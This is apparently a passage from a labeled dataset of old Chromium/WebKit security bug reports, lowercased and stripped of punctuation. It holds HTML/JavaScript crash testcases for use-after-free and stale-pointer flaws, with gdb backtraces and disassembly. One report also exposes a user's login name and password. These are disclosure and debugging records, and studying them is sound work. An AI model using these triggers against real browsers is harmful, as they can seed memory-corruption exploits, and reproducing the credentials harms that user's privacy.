cssfontfacesource getfontdata this fontdescription syntheticbold=false syntheticitalic value optimized out fontselector value optimized out at third_party/webkit/webcore/css/cssfontfacesource.cpp:171 4 in webcore cssfontface getfontdata this fontdescription syntheticbold value optimized out syntheticitalic value optimized out at third_party/webkit/webcore/css/cssfontface.cpp:112 5 in webcore csssegmentedfontface getfontdata this fontdescription at third_party/webkit/webcore/css/csssegmentedfontface.cpp:106 6 in webcore cssfontselector getfontdata this fontdescription value optimized out familyname value optimized out at third_party/webkit/webcore/css/cssfontselector.cpp:543 7 in webcore fontcache getfontdata this font familyindex fontselector at third_party/webkit/webcore/platform/graphics/fontcache.cpp:386 8 in webcore fontfallbacklist fontdataat this font value optimized out realizedfontindex value optimized out at third_party/webkit/webcore/platform/graphics/fontfallbacklist.cpp:105 9 in primaryfontdata this font at third_party/webkit/webcore/platform/graphics/fontfallbacklist.h:66 10 webcore fontfallbacklist determinepitch this font at third_party/webkit/webcore/platform/graphics/fontfallbacklist.cpp:76 11 in isfixedpitch this resolver value optimized out firstline value optimized out islineempty value optimized out previouslinebrokecleanly value optimized out hyphenated clear lastfloatfrompreviousline at third_party/webkit/webcore/platform/graphics/fontfallbacklist.h:47 12 isfixedpitch this resolver value optimized out firstline value optimized out islineempty value optimized out previouslinebrokecleanly value optimized out hyphenated clear lastfloatfrompreviousline at third_party/webkit/webcore/platform/graphics/font.h:271 13 webcore renderblock findnextlinebreak this resolver value optimized out firstline value optimized out islineempty value optimized out previouslinebrokecleanly value optimized out hyphenated clear lastfloatfrompreviousline at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:1641 14 in webcore renderblock layoutinlinechildren this relayoutchildren value optimized out repaintlogicaltop repaintlogicalbottom at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:667 15 in forcelayoutinlinechildren this at third_party/webkit/webcore/rendering/renderblock.h:304 16 webcore rendersvgtext layout this at third_party/webkit/webcore/rendering/svg/rendersvgtext.cpp:133 17 in webcore svgrendersupport layoutchildren start value optimized out selfneedslayout=true at third_party/webkit/webcore/rendering/svgrendersupport.cpp:234 18 in webcore rendersvgcontainer layout this at third_party/webkit/webcore/rendering/rendersvgcontainer.cpp:64 19 in webcore svgrendersupport layoutchildren start value optimized out selfneedslayout=true at third_party/webkit/webcore/rendering/svgrendersupport.cpp:234 20 in webcore rendersvgcontainer layout this at third_party/webkit/webcore/rendering/rendersvgcontainer.cpp:64 21 in webcore svgrendersupport layoutchildren start value optimized out selfneedslayout=true at third_party/webkit/webcore/rendering/svgrendersupport.cpp:234 22 in webcore rendersvgcontainer layout this at third_party/webkit/webcore/rendering/rendersvgcontainer.cpp:64 23 in webcore svgrendersupport layoutchildren start value optimized out selfneedslayout=true at third_party/webkit/webcore/rendering/svgrendersupport.cpp:234 24 in webcore rendersvgcontainer layout this at third_party/webkit/webcore/rendering/rendersvgcontainer.cpp:64 25 in webcore svgrendersupport layoutchildren start value optimized out selfneedslayout=false at third_party/webkit/webcore/rendering/svgrendersupport.cpp:237 26 in webcore rendersvgroot layout this at third_party/webkit/webcore/rendering/rendersvgroot.cpp:119 27 in webcore frameview layout this allowsubtree value optimized out at third_party/webkit/webcore/page/frameview.cpp:843 28 in webcore document updatelayoutignorependingstylesheets this at third_party/webkit/webcore/dom/document.cpp:1681 29 in webcore svgstyledelement svgattributechanged this attrname at third_party/webkit/webcore/svg/svgstyledelement.cpp:256 30 in webcore svggradientelement svgattributechanged this attrname at third_party/webkit/webcore/svg/svggradientelement.cpp:87 31 in webcore svglineargradientelement svgattributechanged this attrname at third_party/webkit/webcore/svg/svglineargradientelement.cpp:79 32 in webcore namednodemap addattribute this prpattribute value optimized out at third_party/webkit/webcore/dom/namednodemap.cpp:261 33 in webcore element setattribute this name value at third_party/webkit/webcore/dom/element.cpp:656 34 in webcore element setattribute this name value at third_party/webkit/webcore/dom/element.cpp:194 35 in webcore svganimatetransformelement resettobasevalue this basevalue at third_party/webkit/webcore/svg/svganimatetransformelement.cpp:109 36 in webcore smiltimecontainer updateanimations this value optimized out elapsed=dwarf-2 expression error dw_op_reg operations must be used either alone or in conjuction with dw_op_piece or dw_op_bit_piece at third_party/webkit/webcore/svg/animation/smiltimecontainer.cpp:280 37 in webcore smiltimecontainer begin this at third_party/webkit/webcore/svg/animation/smiltimecontainer.cpp:103 38 in webcore svgdocumentextensions startanimations this value optimized out at third_party/webkit/webcore/svg/svgdocumentextensions.cpp:98 39 in webcore document implicitclose this at third_party/webkit/webcore/dom/document.cpp:2170 40 in webcore frameloader checkcompleted this at third_party/webkit/webcore/loader/frameloader.cpp:849 41 in webcore frameloader finishedparsing this at third_party/webkit/webcore/loader/frameloader.cpp:783 42 in webcore document finishedparsing this at third_party/webkit/webcore/dom/document.cpp:4227 43 in webcore htmldocumentparser preparetostopparsing this at third_party/webkit/webcore/html/parser/htmldocumentparser.cpp:150 type return to continue or q return to quit 44 in webcore htmldocumentparser finish this at third_party/webkit/webcore/html/parser/htmldocumentparser.cpp:381 45 in webcore documentwriter endifnotloadingmainresource this at third_party/webkit/webcore/loader/documentwriter.cpp:221 46 in webcore frameloader finishedloading this at third_party/webkit/webcore/loader/frameloader.cpp:2157 47 in webcore mainresourceloader didfinishloading this finishtime value optimized out at third_party/webkit/webcore/loader/mainresourceloader.cpp:457 48 in webkit_glue weburlloaderimpl context oncompletedrequest this status value optimized out security_info value optimized out completion_time at webkit/glue/weburlloader_impl.cc:656 49 in resourcedispatcher onrequestcomplete this value optimized out request_id value optimized out status security_info completion_time at chrome/common/resource_dispatcher.cc:452 50 in dispatchtomethod resourcedispatcher void resourcedispatcher int urlrequeststatus const std string const base time const int urlrequeststatus std basic_string char std char_traits char std allocator char base time this message at base/tuple.h:577 51 dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int urlrequeststatus const std string const base time const this message at ipc/ipc_message_utils.h:928 52 resourcedispatcher dispatchmessage this message at chrome/common/resource_dispatcher.cc:525 53 in resourcedispatcher onmessagereceived this message at chrome/common/resource_dispatcher.cc:297 54 in childthread onmessagereceived this msg at chrome/common/child_thread.cc:144 55 in messageloop runtask this task at base/message_loop.cc:421 56 in messageloop deferorrunpendingtask this pending_task value optimized out at base/message_loop.cc:430 57 in messageloop dowork this at base/message_loop.cc:537 58 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 59 in runhandler this at base/message_loop.cc:241 60 messageloop run this at base/message_loop.cc:219 61 in base thread threadmain this at base/thread.cc:164 62 in threadfunc params value optimized out at base/platform_thread_posix.cc:53 63 in start_thread arg value optimized out at pthread_create.c:304 64 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 65 in gdb disas dump of assembler code for function webcore element getattribute webcore qualifiedname const const 0 push rbp 1 mov rsi rbp 4 push rbx 5 mov rdi rbx 8 sub rsp 12 mov rip rax 19 mov rax rdx 22 cmp rdx rsi 25 je webcore element getattribute webcore qualifiedname const const+202 31 mov rbx eax 34 test eax 39 je webcore element getattribute webcore qualifiedname const const+182 45 mov rbx rax 49 test rax rax 52 je webcore element getattribute webcore qualifiedname const const+168 54 mov rax r8d 58 test r8d r8d 61 je webcore element getattribute webcore qualifiedname const const+168 63 mov rax rdi 67 mov rbp rsi 71 mov rdi rax 74 mov rax rdx 78 cmp rsi rdx 81 je webcore element getattribute webcore qualifiedname const const+127 83 mov rsi rbp 87 mov ecx 92 xor ebx ebx 94 xchg ax ax 96 cmp rbp rdx 100 je webcore element getattribute webcore qualifiedname const const+144 102 add ebx 105 cmp ebx r8d 108 jbe webcore element getattribute webcore qualifiedname const const+168 110 mov rdi rcx,1 rax 114 add rcx 118 mov rax rdx 122 cmp rsi rdx 125 jne webcore element getattribute webcore qualifiedname const const+96 127 add rsp 131 add rax 135 pop rbx 136 pop rbp 137 retq 138 jmp webcore element getattribute webcore qualifiedname const const+144 140 nop 141 nop 142 nop 143 nop 144 mov rsi r9 148 cmp r9 rdx 152 je webcore element getattribute webcore qualifiedname const const+127 type return to continue or q return to quit 154 add ebx 157 cmp ebx r8d 160 ja webcore element getattribute webcore qualifiedname const const+110 162 jmp webcore element getattribute webcore qualifiedname const const+168 164 nop 165 nop 166 nop 167 nop 168 mov rip rax 175 add rsp 179 pop rbx 180 pop rbp 181 retq 182 mov rbx rax 185 mov rbp rsi 188 mov rbx rdi 191 callq rax 197 jmpq webcore element getattribute webcore qualifiedname const const+45 202 mov rdi eax 205 test eax 210 jne webcore element getattribute webcore qualifiedname const const+34 216 mov rdi rax 219 jmp webcore element getattribute webcore qualifiedname const const+224 221 nop 222 nop 223 nop 224 callq rax 230 jmpq webcore element getattribute webcore qualifiedname const const+31 end of assembler dump gdb c continuing program terminated with signal sigsegv segmentation fault the program no longer exists	11
issue with merging anonymous block in renderblock removechild 2 investigating second testcase from 68439 testcase html head script type text/javascript var el array function boom el 5 document.createelement span el 5 style.display run-in document.documentelement.appendchild el 5 el 6 document.createelement span el 6 style.display list-item document.documentelement.appendchild el 6 el 17 document.createelement embed document.documentelement.appendchild el 17 el 19 document.createelement layer document.documentelement.appendchild el 19 el 29 document.createelement note document.documentelement.appendchild el 29 el 37 document.createelement blockquote document.documentelement.appendchild el 37 alert 0 el 19 parentnode.removechild el 19 el 5 appendchild el 19 alert 1 el 29 parentnode.removechild el 29 el 19 appendchild el 29 alert 2 el 37 parentnode.removechild el 37 el 29 appendchild el 37 alert 3 el 17 parentnode.removechild el 17 alert 4 el 6 parentnode.removechild el 6 crash alert failed not reached script body onload boom body html	9
invalid read in convertv8objecttonpvariant tracking upstream originally reported by bbudge google.com	9
oom handler not always properly terminating process credit david warren of cert/cc thanks to david for his persistence we appear to have confirmed that oom on windows at least can continue execution with a null return value instead of just exiting the process i ve already fixed the bug i m filing this so we can track the announce credit and need to merge to m9	9
chrome crash report stack signature webcore historycontroller itemsareclones webcore historyitem webcore historyitem 1aac1833_b327c8d5_54766948_831eaab7_2eed033e product chrome stack signature webcore historycontroller itemsareclones webcore historyitem webcore historyitem 1f105a1 new signature label webcore historycontroller itemsareclones webcore historyitem webcore historyitem new signature hash 1aac1833_b327c8d5_54766948_831eaab7_2eed033e report link meta information product name chrome product version 10.0.644.0 report id be138e5674d55a54 report time 2011/01/21 00:26:48 fri uptime 152 sec cumulative uptime 0 sec os name windows nt os version 5.1.2600 service pack 3 cpu architecture x86 cpu info authenticamd family 15 model 79 stepping 2 thread 0 crashed exception_access_violation_read chrome.dll historycontroller.cpp:669 webcore historycontroller itemsareclones webcore historyitem webcore historyitem chrome.dll historycontroller.cpp:614 webcore historycontroller recursivesetprovisionalitem webcore historyitem webcore historyitem webcore frameloadtype chrome.dll historycontroller.cpp:627 webcore historycontroller recursivesetprovisionalitem webcore historyitem webcore historyitem webcore frameloadtype chrome.dll historycontroller.cpp:248 webcore historycontroller gotoitem webcore historyitem webcore frameloadtype chrome.dll webframeimpl.cpp:898 webkit webframeimpl loadhistoryitem webkit webhistoryitem const chrome.dll render_view.cc:1431 renderview onnavigate viewmsg_navigate_params const chrome.dll xstring:1058 std basic_string char std char_traits char std allocator char assign std basic_string char std char_traits char std allocator char const unsigned int unsigned int ntdll.dll seh_epilog ntdll.dll rtlallocateheap chrome.exe free.c:109 free chrome.exe free.c:115 free chrome.dll thread_cache.h:378 tcmalloc threadcache getthreadheap chrome.dll tcmalloc.cc:1040 anonymous namespace do_free_with_callback void void void chrome.dll render_view.cc:973 renderview onmessagereceived ipc message const chrome.dll message_router.cc:46 messagerouter routemessage ipc message const chrome.dll message_router.cc:38 messagerouter onmessagereceived ipc message const chrome.dll child_thread.cc:168 childthread onmessagereceived ipc message const chrome.dll task.h:331 runnablemethod history historybackend void history historybackend gurl const tuple1 gurl run chrome.dll message_loop.cc:356 messageloop runtask task chrome.dll message_loop.cc:365 messageloop deferorrunpendingtask messageloop pendingtask const chrome.dll message_loop.cc:558 messageloop dowork chrome.dll message_pump_default.cc:50 base messagepumpdefault run base messagepump delegate chrome.dll message_loop.cc:331 messageloop runinternal chrome.dll message_loop.cc:304 messageloop runhandler chrome.dll message_loop.cc:234 messageloop run chrome.dll renderer_main.cc:297 renderermain mainfunctionparams const chrome.dll chrome_main.cc:919 chromemain chrome.exe client_util.cc:280 maindllloader launch hinstance sandbox sandboxinterfaceinfo chrome.exe chrome_exe_main_win.cc:46 wwinmain chrome.exe crt0.c:263 tmaincrtstartup kernel32.dll baseprocessstart	7
possible location bar ssl spoofing chrome version 6.0.472.53 other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 fail firefox 3.x fail ie 7 fail ie 8 fail what steps will reproduce the problem 1 open a new tab and go to 2 go to test 3 reload and back what is the expected result the location bar is spoofed with valid ssl/tls certificate	5
browser crash javascriptappmodaldialog cleanup chrome version 7.0.517.44 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 ok firefox 3.x ok ie 7/8 ok what steps will reproduce the problem 1 go to 2 check prevent this page from creating additional dialogs 3 close either tab with or application what is the expected result tab or application should be closed what happens instead crash following by hanging of application one time it comes along with drwtsn32 crash please provide any additional information below attach a screenshot if possible	11
stale pointers in cssom 2 split off from bug 68558 reporter serg gglazunov 2 webkitcsskeyframerule sets its style declaration m_parent to the parent rule in void webkitcsskeyframerule setdeclaration passrefptr cssmutablestyledeclaration style m_style style m_style setparent parent and does n't call m_style setparent 0 when the keyframe rule is detached version chromium 10.0.628.0 70414 repro html head script function step1 style document.createelement style style.textcontent webkit-keyframes anim from color green document.head.appendchild style rule document.stylesheets 0 cssrules 0 findrule from document.head.removechild style settimeout step2 100 function step2 obj rule.style.parentrule location.reload script head body onload step1 body html	11
crash by form controls with form attributes under orphan nodes chrome version 9.0.597.67 beta urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue opera 11 ok safari 5 ok firefox 3.x ok firefox 4.x ok chrome 8.0.552.237 mac os x windows xp ok chrome 9.0.597.67 mac os x windows xp several systems windows 7 fail chrome 10.x mac os x fail ie 7/8 ok what steps will reproduce the problem 1 login on username stefanvanzanden gmail.com and password test123 2 hover de tab called projecten 3 click on the project bbvk lammertkamp 40 4 click on the category algemeen it is crashing the most on this one but you can also try other tabs as long as it is containing forms 5 refresh this tab press f5 when window is focused until the crash happens often within the first 10 refreshes what is the expected result well that it stops crashing what happens instead getting an aw snap bwod blue window of death message without detailed information on what goes wrong please provide any additional information below attach a screenshot if possible 1 from my own javascript logs it seems to crash alot on and stops on random logs but mostly the problems occur when destroying an item where i first disconnect events from domelements before destroying the domelement but beside this i also see it crash when adding a class or applying a style using dojo 1.4 2 i thought the problems occured because due to the legacy code i am doing alot some evalling of inline generated javascript but i am currently removing all this on another development environment but all it does is make it crash just a bit less 3 all crashes should have been send to google it is enabled so maybe that could help 4 this problem is occuring on several systems using google chrome 9 beta 5 i hope this can be fixed we currently have an average of 49 of our users using chrome and after our efforts to convince them using it would be rather bad to have them move to either firefox thanks in advanced for any reply fix or more information for me to debug the problem stefan van zanden	9
height of rect integer overflow it s related to issue 64184 but use different way to set height i filled new bug report becouse it was fixed and this can be something new crashes on linux 32-bit dev 10.0.634.0 build 70875 repro file crash1.xml html xmlns head script type text/ecmascript cdata function main obj window.document.childnodes 0 childnodes 3 childnodes 1 viewbox.baseval obj.height 3.41e38 window.onload main script head body svg version 1.1 xmlns rect height 10 width 100 rect svg body html program received signal sigsegv segmentation fault switching to thread lwp 3815 sk_memset32_sse2 dst value=4278190080 count=700 at third_party/skia/src/opts/skutils_opts_sse2.cpp:66 66 mm_store_si128 d value_wide 0 sk_memset32_sse2 dst value=4278190080 count=700 at third_party/skia/src/opts/skutils_opts_sse2.cpp:66 1 in color32_sse2 dst src count=16284 color=4278190080 at third_party/skia/src/opts/skblitrow_opts_sse2.cpp:333 2 in skargb32_blitter blith this x=108 y=368 width=16284 at third_party/skia/src/core/skblitter_argb32.cpp:100 3 in walk_edges prevhead value optimized out filltype value optimized out blitter start_y=8 stop_y=390 proc=0 at third_party/skia/src/core/skscan_path.cpp:165 4 in sk_fill_path path cliprect blitter start_y value optimized out stop_y value optimized out shiftedgesup value optimized out cliprgn at third_party/skia/src/core/skscan_path.cpp:557 5 in skscan fillpath path clip blitter at third_party/skia/src/core/skscan_path.cpp:641 6 in skscan antifillpath path clip blitter at third_party/skia/src/core/skscan_antipath.cpp:387 7 in skdraw drawpath this origsrcpath paint prepathmatrix pathismutable=false at third_party/skia/src/core/skdraw.cpp:917 8 in skdevice drawpath this draw path paint prepathmatrix pathismutable value optimized out at third_party/skia/src/core/skdevice.cpp:111 9 in skcanvas drawpath this path paint at third_party/skia/src/core/skcanvas.cpp:1168 10 in webcore graphicscontext fillpath this pathtofill at third_party/webkit/source/webcore/platform/graphics/skia/graphicscontextskia.cpp:749 11 in webcore rendersvgresourcesolidcolor postapplyresource this context resourcemode=2 path at third_party/webkit/source/webcore/rendering/rendersvgresourcesolidcolor.cpp:85 12 in webcore rendersvgpath fillandstrokepath this context at third_party/webkit/source/webcore/rendering/svg/rendersvgpath.cpp:161 13 in webcore rendersvgpath paint this paintinfo at third_party/webkit/source/webcore/rendering/svg/rendersvgpath.cpp:224 14 in webcore renderbox paint this paintinfo tx value optimized out ty=0 at third_party/webkit/source/webcore/rendering/renderbox.cpp:755 15 in webcore rendersvgroot paint this paintinfo parentx=8 parenty=8 at third_party/webkit/source/webcore/rendering/rendersvgroot.cpp:184 16 in webcore inlinebox paint this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/inlinebox.cpp:184 17 in webcore inlineflowbox paint this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/inlineflowbox.cpp:982 18 in webcore rootinlinebox paint this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/rootinlinebox.cpp:180 19 in webcore renderlineboxlist paint this renderer paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderlineboxlist.cpp:256 20 in webcore renderblock paintcontents this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2324 21 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2434 dump of assembler code for function z16sk_memset32_sse2pjji 0 push ebp 1 mov esp ebp 3 sub esp 6 mov ebp eax 9 mov ebp edx 12 mov ebp ecx 15 cmp eax 18 jle z16sk_memset32_sse2pjji+94 20 test dl 23 je z16sk_memset32_sse2pjji+50 25 lea esi eiz,1 esi 32 mov ecx edx 34 add edx 37 sub eax 40 test dl 43 jne z16sk_memset32_sse2pjji+32 45 cmp eax 48 jle z16sk_memset32_sse2pjji+94 50 mov ecx ebp 53 movd ebp xmm1 58 pshufd xmm1 xmm0 63 nop 64 sub eax 67 movdqa xmm0 edx 71 movdqa xmm0 edx 76 movdqa xmm0 edx eax 700 ecx 16777216 edx 1434755088 ebx 49558828 esp ebp esi 16284 edi 1434817360 eip sk_memset32_sse2 unsigned int unsigned int int 71 eflags if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 st0 0 raw st1 1 raw st2 0 raw st3 0 raw st4 8 raw st5 8 raw st6 8 raw st7 8 raw fctrl 895 fstat 16431 ftag 65535 fiseg 0 fioff 0 foseg 0 fooff 0 fop 0 xmm0 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm1 v4_float v2_double v16_int8 repeats 12 times v8_int16 v4_int32 v2_int64 uint128 xmm2 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm3 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm4 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm5 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm6 v4_float v2_double v16_int8 v8_int16 v4_int32 v2_int64 uint128 xmm7 v4_float v2_double v16_int8 repeats 16 times v8_int16 v4_int32 v2_int64 uint128 mxcsr pe im dm zm om um pm mm0 uint64 v2_int32 v4_int16 v8_int8 mm1 uint64 v2_int32 v4_int16 v8_int8 mm2 uint64 v2_int32 v4_int16 v8_int8 mm3 uint64 v2_int32 v4_int16 v8_int8 mm4 uint64 v2_int32 v4_int16 v8_int8 mm5 uint64 v2_int32 v4_int16 v8_int8 mm6 uint64 v2_int32 v4_int16 v8_int8 mm7 uint64 v2_int32 v4_int16 v8_int8 full backtrace attached bt1.txt	9
pickle findnext reads payload_size without checking that the header is complete valgrind reports the following on automated_ui_test 24480 thread 2 24480 conditional jump or move depends on uninitialised value s 24480 at pickle findnext unsigned long char const char const pickle.cc:412 24480 by ipc message findnext char const char const ipc_message.h:168 24480 by ipc channel channelimpl processincomingmessages ipc_channel_posix.cc:625 24480 by ipc channel channelimpl onfilecanreadwithoutblocking int ipc_channel_posix.cc:1006 24480 by base messagepumplibevent filedescriptorwatcher onfilecanreadwithoutblocking int base messagepumplibevent message_pump_libevent.cc:96 24480 by base messagepumplibevent onlibeventnotification int short void message_pump_libevent.cc:336 24480 by event_process_active event.c:385 24480 by event_base_loop event.c:525 24480 by base messagepumplibevent run base messagepump delegate message_pump_libevent.cc:243 24480 by messageloop runinternal message_loop.cc:331 24480 by messageloop runhandler message_loop.cc:304 24480 by messageloop run message_loop.cc:234 24480 uninitialised value was created by a heap allocation 24480 at operator new unsigned long vg_replace_malloc.c:906 24480 by std string rep s_create unsigned long unsigned long std allocator char const new_allocator.h:89 24480 by std string rep m_clone std allocator char const unsigned long basic_string.tcc:607 24480 by std string reserve unsigned long basic_string.tcc:488 24480 by std string append char const unsigned long basic_string.tcc:309 24480 by ipc channel channelimpl processincomingmessages ipc_channel_posix.cc:599 24480 by ipc channel channelimpl onfilecanreadwithoutblocking int ipc_channel_posix.cc:1006 24480 by base messagepumplibevent filedescriptorwatcher onfilecanreadwithoutblocking int base messagepumplibevent message_pump_libevent.cc:96 24480 by base messagepumplibevent onlibeventnotification int short void message_pump_libevent.cc:336 24480 by event_process_active event.c:385 24480 by event_base_loop event.c:525 24480 by base messagepumplibevent run base messagepump delegate message_pump_libevent.cc:243 it seems that there is no guarantee that end start is at least kpayloadunit therefore is may not contain a full header the read of hdr payload_size at pickle.cc:412 will return an undefined value then	9
stale pointer due to table childs incorrect added vulnerability details under certain circumstances chromium will crash due to an attempt to fetch an instruction from null called from webcore renderobjectchildlist destroyleftoverchildren the crash usually occurs after the page is refreshed so the proof of concept causes the page to refresh using a meta tag in my testing it did not take more than one refresh to trigger the crash version chrome version chromium 8.0.552.237 ubuntu 10.04 stable operating system ubuntu 10.04 64 bit reproduction case html head title webcore renderobjectchildlist destroyleftoverchildren crash poc title meta http-equiv refresh content 1 head body onload boom div style display table em id em em audio controls arbitrary style display table-caption img id img div script type text/javascript function boom var img document.getelementbyid img var em document.getelementbyid em em.parentnode.replacechild img em script body html for crashes please include the following additional information type of crash tab a shortened version of the trace through the program using gdb is included below the full version as well as the reproduction case are attached chromium-browser debug single-process poc.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.8wt0zi gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from usr/lib/debug/usr/lib/chromium-browser/chromium-browser done done gdb run program received signal sigsegv segmentation fault switching to thread lwp 4990 in gdb bt 0 in 1 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:47 2 in webcore renderblock destroy this at third_party/webkit/webcore/rendering/renderblock.cpp:156 3 in webcore rendertablecell destroy this at third_party/webkit/webcore/rendering/rendertablecell.cpp:59 4 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:57 5 in webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2154 6 in webcore rendertablerow destroy this at third_party/webkit/webcore/rendering/rendertablerow.cpp:49 7 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:57 8 in webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2154 gdb frame 1 1 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:47 47 third_party/webkit/webcore/rendering/renderobjectchildlist.cpp no such file or directory in third_party/webkit/webcore/rendering/renderobjectchildlist.cpp gdb disassemble dump of assembler code for function zn7webcore21renderobjectchildlist23destroyleftoverchildrenev 0 push rbx 1 mov rdi rbx 4 mov rdi rdi 7 nopw rax rax,1 16 test rdi rdi 19 je zn7webcore21renderobjectchildlist23destroyleftoverchildrenev+69 21 mov rdi rax 24 callq rax 30 test al al 32 je zn7webcore21renderobjectchildlist23destroyleftoverchildrenev+80 34 mov rbx rdi 37 mov rdi rdx 41 test rdx rdx 44 je zn7webcore21renderobjectchildlist23destroyleftoverchildrenev+16 46 mov rdx rax 49 mov rdi rsi 52 mov rdx rdi 55 callq rax type return to continue or q return to quit q quit gdb i r rax 140737370394336 rbx 140737370389160 rcx 23 rdx 140737370393984 rsi 60 rdi 140737370393984 rbp rsp r8 0 r9 63 r10 140737372214528 r11 140737202743500 r12 140737015059969 r13 140737370804680 r14 140737370804784 r15 2 rip webcore renderobjectchildlist destroyleftoverchildren 30 eflags if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0 gdb print this 1 m_firstchild m_lastchild gdb	11
stale pointer in webcore rendertable firstlineboxbaseline vulnerability details under certain circumstances chromium will crash due to an attempt to fetch an instruction from null called from webcore rendertable firstlineboxbaseline this occurs after performing dom insertions and removals on a document included in a second using an iframe version chrome version chromium 8.0.552.237 ubuntu 10.04 stable operating system ubuntu 10.04 64 bit reproduction case two files are required to reproduce this vulnerability the file outer.html essentially just creates an iframe with a src of inner.html outer.html html head title webcore rendertable firstlineboxbaseline crash poc outer title head body iframe width 200 height 200 src inner.html iframe body html inner.html html head title webcore rendertable firstlineboxbaseline crash poc inner title head body onload boom nobr aaaaaaaaa nobr table aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa table ol id ol style display webkit-box visibility collapse iframe id n44 aaa iframe note id n13 style display table-row-group a note ol address a address body a body base id base style display table-cell base script type text/javascript function reference domnode this.domnode domnode function walk a currentprefix index domnode if domnode null return newprefix currentprefix index walk a currentprefix index 1 domnode.nextsibling walk a newprefix 0 domnode.firstchild a newprefix new reference domnode function clear var a new array walk a 0 document.body for key in a a key domnode.parentnode.removechild a key domnode if document.body document.body.offsettop function boom var tn document.getelementbyid ol tn.parentnode.removechild tn document.getelementbyid base appendchild tn window.settimeout clear 200 script body html for crashes please include the following additional information type of crash tab a shortened version of the trace through the program using gdb is included below the full version as well as the reproduction cases are attached chromium-browser debug single-process outer.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.zvhkyi gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from usr/lib/debug/usr/lib/chromium-browser/chromium-browser done done gdb run program received signal sigsegv segmentation fault switching to thread lwp 5543 in gdb bt 0 in 1 in webcore rendertable firstlineboxbaseline this value optimized out at third_party/webkit/webcore/rendering/rendertable.cpp:1109 2 in webcore renderblock firstlineboxbaseline this value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:5205 3 in webcore renderblock firstlineboxbaseline this value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:5205 4 in webcore rendertablecell baselineposition this firstline=false isrootlinebox=96 at third_party/webkit/webcore/rendering/rendertablecell.cpp:302 5 in webcore rendertablesection calcrowheight this at third_party/webkit/webcore/rendering/rendertablesection.cpp:365 6 in webcore rendertable layout this at third_party/webkit/webcore/rendering/rendertable.cpp:285 7 in webcore renderblock layoutblockchild this child margininfo previousfloatlogicalbottom value optimized out maxfloatlogicalbottom value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:1905 gdb frame 1 1 in webcore rendertable firstlineboxbaseline this value optimized out at third_party/webkit/webcore/rendering/rendertable.cpp:1109 1109 third_party/webkit/webcore/rendering/rendertable.cpp no such file or directory in third_party/webkit/webcore/rendering/rendertable.cpp gdb disassemble dump of assembler code for function znk7webcore11rendertable20firstlineboxbaselineev 0 push rbx 1 mov rdi rax 8 test rax rax 11 je znk7webcore11rendertable20firstlineboxbaselineev+64 13 mov rax ebx 19 test ebx ebx 21 jne znk7webcore11rendertable20firstlineboxbaselineev+41 23 mov edx 28 mov rax rsi 31 callq znk7webcore11rendertable12sectionbelowepkns_18rendertablesectioneb 36 test rax rax 39 je znk7webcore11rendertable20firstlineboxbaselineev+96 41 mov rax ebx 44 mov rax rdx 47 mov rax rdi 50 callq rdx 56 add ebx eax type return to continue or q return to quit q quit gdb i r rax 140737370406256 rbx 0 rcx 16 rdx 140737370407008 rsi 0 rdi 140737370406256 rbp rsp r8 0 r9 0 r10 140737331338088 r11 0 r12 0 r13 0 r14 0 r15 0 rip webcore rendertable 